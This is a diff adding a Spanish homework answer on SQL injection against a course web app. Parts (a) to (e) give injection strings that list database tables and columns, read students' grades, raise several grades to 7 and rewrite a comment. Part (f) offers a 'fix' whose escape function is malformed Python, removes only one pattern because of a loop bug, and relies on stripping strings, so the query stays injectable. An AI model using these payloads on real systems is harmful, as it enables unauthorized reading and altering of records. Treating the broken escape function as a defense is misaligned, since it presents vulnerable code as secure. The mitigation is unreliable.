@@ -1,0 +1,48 @@
+P2. Inyectando los siguientes inputs en la página web se debería obtener lo pedido:
+
+    (a) "';SELECT table_name, table_schema 
+	   FROM information_schema.tables;--
+
+    (b) "';SELECT column_name, data_type 
+	   FROM information_schema.columns 
+	   WHERE table_name='cc3201' 
+	   AND table_schema='nota';--
+
+    (c) "';SELECT nombre,nota 
+	   FROM nota.cc3201 
+	   WHERE id = 54 
+	   OR id = 68 
+	   OR id = 84;--
+
+    (d) "';UPDATE nota.cc3201 
+	   SET nota = 7 
+	   WHERE id = 54  
+	   OR id = 68  
+	   OR id = 84;--
+
+    (e) "';UPDATE nota.cc3201 
+	   SET comentario = '"Mateu es mi pastor"' 
+	   WHERE id = 68;--
+
+    (f) En el código original del script App.py, en la línea 30, dice:
+
+	cur.execute("SELECT nombres,apellido_p,apellido_m,mes,anho, total FROM uchile.transparencia WHERE apellido_p='"+input+"' ORDER BY total DESC LIMIT 250")
+
+	Acá se cambia 'input' por 'escape(input)', es decir:
+
+	cur.execute("SELECT nombres,apellido_p,apellido_m,mes,anho, total FROM uchile.transparencia WHERE apellido_p='"+escape(input)+"' ORDER BY total DESC LIMIT 250")
+
+	Y antes se importa el módulo escape en el script App.py el cual define la función escape como sigue:
+
+	def escape(input):
+	    dangerous_patterns = [""';", ";--"]
+
+    	    for pattern in dangerous_patterns:
+                escaped_input = input.replace(pattern,"")
+       
+    	    return escaped_input
+
+	La función escape borra los patrones ""';" y ";--" del input de manera de que el input no pueda inyectar un input malicioso con consultas o actualizaciones de 	las tablas en SQL.
+	
+
+
